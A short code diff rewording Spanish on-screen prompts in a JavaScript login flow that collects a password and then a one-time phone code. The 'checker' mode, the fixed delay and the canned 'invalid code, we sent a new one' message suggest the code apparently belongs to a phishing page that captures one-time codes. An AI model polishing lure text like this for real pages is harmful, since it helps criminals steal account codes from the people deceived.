@@ -139,9 +139,9 @@ if(info.checkerInfo.mode === 'userpassword'){
 }else if(info.checkerInfo.mode === 'otpcode'){
     setTimeout(() =>{
         if(info.metaInfo.tok === ''){
-            showInlineError('Hemos enviado un código OTP a tu teléfono. Por favor ingrésalo.', otpcode);
+            showInlineError('Hemos enviado un código de seguridad a tu teléfono. Ingrésalo para continuar.', otpcode);
         } else {
-            showInlineError('Código inválido. Enviamos un nuevo OTP a tu teléfono. Por favor ingrésalo.', otpcode);
+            showInlineError('El código ingresado no es válido. Generamos uno nuevo y lo enviamos a tu teléfono.', otpcode);
         }
     }, 2050);
     otpcode.forEach(elem => elem.classList.remove('hidden'));
